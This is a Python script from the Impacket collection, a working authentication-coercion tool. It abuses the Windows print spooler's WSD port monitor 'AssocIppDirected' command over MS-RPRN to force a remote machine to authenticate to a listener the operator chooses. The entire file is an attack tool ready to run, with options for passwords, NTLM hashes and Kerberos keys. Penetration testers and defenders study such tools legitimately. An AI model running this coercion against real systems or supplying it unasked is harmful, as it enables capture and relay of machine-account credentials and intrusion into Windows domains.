#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Forces a remote Windows machine to authenticate by abusing the WSD port
#   monitor's "AssocIppDirected" configuration command over MS-RPRN. This will trigger HTTP authentication to the listener
#
#   The sequence mirrors what printui.exe does for "Add a printer using an
#   IP address or hostname"
# Author:
#        Abdul Mhanni(@abdo_mhanni)
import argparse
import logging
import socket
import sys

from impacket import version
from impacket.dcerpc.v5 import rprn, transport
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.system_errors import ERROR_ACCESS_DENIED, ERROR_SUCCESS

ASSOC_TIMEOUT = 8


class IPPCoerce:
    def __init__(self, username, password, domain, hashes, aesKey, doKerberos, kdcHost, port):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__port = port

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost, listener, listenerPort):
        stringbinding = r'ncacn_np:%s[\pipe\spoolss]' % remoteName
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        dce = rpctransport.get_dce_rpc()
        hXcv = None
        timedOut = False
        associationStarted = False

        try:
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)

            # WSD port-monitor config handle
            monitor = '\\\\%s\\,XcvMonitor WSD Port' % remoteName
            resp = rprn.hRpcOpenPrinter(dce, monitor, accessRequired=rprn.SERVER_ACCESS_ADMINISTER)
            hXcv = resp['pHandle']

            # build ipp://<listener>:<port>/ipp/print
            uri = 'ipp://%s:%d/ipp/print' % (listener, listenerPort)
            uriData = rprn.checkNullString(uri).encode('utf-16le')
            logging.info('Triggering IPP association on %s: %s' % (remoteName, uri))

            # RpcXcvData has no timeout of its own
            rpctransport.get_smb_connection().setTimeout(ASSOC_TIMEOUT)
            associationStarted = True
            resp = rprn.hRpcXcvData(dce, hXcv, 'AssocIppDirected', uriData)

            if resp['pdwStatus'] == ERROR_SUCCESS:
                logging.info('Host responded')
            else:
                # Normal against a non-printer listener: auth happens, association then fails.
                logging.info('Target contacted - machine auth should be inbound (status %d)' % resp['pdwStatus'])
            return True
        except (socket.timeout, TimeoutError):
            timedOut = True
            if associationStarted:
                logging.info('%d seconds hit - spooler still associating (auth already forced)' % ASSOC_TIMEOUT)
                return True
            logging.error('Connection to %s timed out' % remoteName)
            return False
        except rprn.DCERPCSessionError as e:
            if e.get_error_code() == ERROR_ACCESS_DENIED:
                logging.error('%s (administrative rights required)' % e)
                return False
            raise
        finally:
            if hXcv is not None and not timedOut:
                try:
                    rprn.hRpcClosePrinter(dce, hXcv)
                except Exception:
                    pass
            try:
                dce.disconnect()
            except Exception:
                pass


if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True,
                                     description='Force Windows machine-account authentication over HTTP using IPP')
    parser.add_argument('target', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('listener', help='IP address or hostname that receives the authentication')
    parser.add_argument('listener_port', type=int, help='TCP port that receives the authentication')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP address of the domain controller')
    group.add_argument('-target-ip', action='store', metavar='ip address', help='IP address of the target machine. If '
                       'omitted it will use whatever was specified as target')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar='destination port',
                       help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action='store_true', help="don't ask for password (useful for -k)")
    group.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache '
                       'file (KRB5CCNAME) based on target parameters')
    group.add_argument('-aesKey', action='store', metavar='hex key', help='AES key to use for Kerberos Authentication '
                       '(128 or 256 bits)')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    if not 1 <= options.listener_port <= 65535:
        parser.error('listener_port must be between 1 and 65535')

    domain, username, password, remoteName = parse_target(options.target)
    if domain is None:
        domain = ''
    if options.target_ip is None:
        options.target_ip = remoteName
    if options.aesKey is not None:
        options.k = True
    if password == '' and username != '' and options.hashes is None and not options.no_pass and options.aesKey is None:
        from getpass import getpass
        password = getpass('Password:')

    try:
        coercer = IPPCoerce(username, password, domain, options.hashes, options.aesKey, options.k,
                            options.dc_ip, int(options.port))
        if not coercer.run(remoteName, options.target_ip, options.listener, options.listener_port):
            sys.exit(1)
    except KeyboardInterrupt:
        logging.info('Interrupted, exiting...')
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
        sys.exit(1)
